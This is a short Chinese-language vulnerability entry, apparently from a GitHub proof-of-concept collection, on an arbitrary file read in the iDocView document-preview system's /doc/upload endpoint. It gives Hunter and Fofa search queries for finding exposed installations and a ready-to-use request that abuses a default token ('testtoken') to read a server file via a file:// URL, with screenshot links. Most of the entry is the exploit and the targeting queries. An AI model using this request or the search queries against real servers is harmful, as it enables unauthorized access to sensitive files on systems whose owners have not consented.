## iDocView upload接口任意文件读取
 iDocView是一个在线文档预览系统 /doc/upload 接口处存在任意文件读取漏洞，未授权的攻击者可以利用此接口并携带默认token读取服务器敏感文件信息，使系统处于极度不安全的状态。 

## 资产测绘
```
Hunter语法：
app.name="I Doc View"
Fofa语法：
title="I Doc View"
```

## poc
```
http://xxxxxx/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name=test.txt
```
![image](https://github.com/wy876/POC/assets/139549762/01f5a3a7-9cd3-45bc-beb0-5cd6ab800171)

![image](https://github.com/wy876/POC/assets/139549762/0e549cdd-9c98-41b5-874d-8a159cf3db19)
